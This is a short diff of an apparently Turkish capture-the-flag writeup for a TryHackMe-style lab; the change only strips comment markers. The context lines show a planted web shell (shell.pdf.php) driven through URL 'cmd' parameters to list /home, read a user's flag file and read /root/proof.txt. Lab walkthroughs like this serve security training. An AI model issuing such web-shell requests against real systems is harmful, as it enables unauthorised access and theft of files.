@@ -68,12 +68,12 @@ Shell çalışıyor ve bize "boom!" mesajı gösteriyor. Bu, hacker'ın shell'in
 Web shell üzerinden sistemde keşif yapmaya başladık:
 
 <pre>http://10.81.185.192/cvs/shell.pdf.php?cmd=ls+/home</pre>
-# Çıktı: kullanıcı adını gösterir (örnek: ubuntu, tryhackme, user)
+Çıktı: kullanıcı adını gösterir (örnek: ubuntu, tryhackme, user)
 
-# Bulduğumuz kullanıcının user.txt dosyasını oku
+Bulduğumuz kullanıcının user.txt dosyasını oku
 <pre>http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/home/[BULUNAN_KULLANICI]/user.txt</pre>
 
-# /root dizinindeki proof.txt dosyasını oku
+/root dizinindeki proof.txt dosyasını oku
 <pre>http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/root/proof.txt</pre>
 <img width="676" height="374" alt="image" src="https://github.com/user-attachments/assets/450af6d7-5b45-42fe-96c3-50085bf6eb0b" />
 
